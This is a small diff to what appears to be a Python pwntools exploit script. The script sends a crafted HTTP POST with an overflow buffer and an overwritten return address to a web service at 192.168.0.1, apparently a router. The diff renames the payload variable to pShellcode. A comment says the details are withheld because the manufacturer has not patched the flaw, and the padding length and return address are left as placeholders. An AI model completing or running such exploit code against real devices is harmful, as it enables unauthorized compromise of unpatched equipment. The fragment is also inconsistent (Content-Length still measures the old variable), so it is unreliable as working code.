@@ -45,7 +45,7 @@ print 'tokenid is %s' % tokenid
 newRet = '\x00\x00\x00\x00'
 
 #More details, as the manufacturer did not fix, will not be disclosed here.
-pBuf=''
+pShellcode=''
 
 pMy= "L"*xx+ newRet
 
@@ -66,7 +66,7 @@ payload += "Upgrade-Insecure-Requests: 1" + rn
 payload += ("Content-Length: %d" % len(pBuf)) +rn
 payload += 'Content-Type: application/x-www-form-urlencoded'+rn
 payload += rn
-payload += pBuf
+payload += pShellcode
 
 p = remote('192.168.0.1', 80)
 p.send(payload)
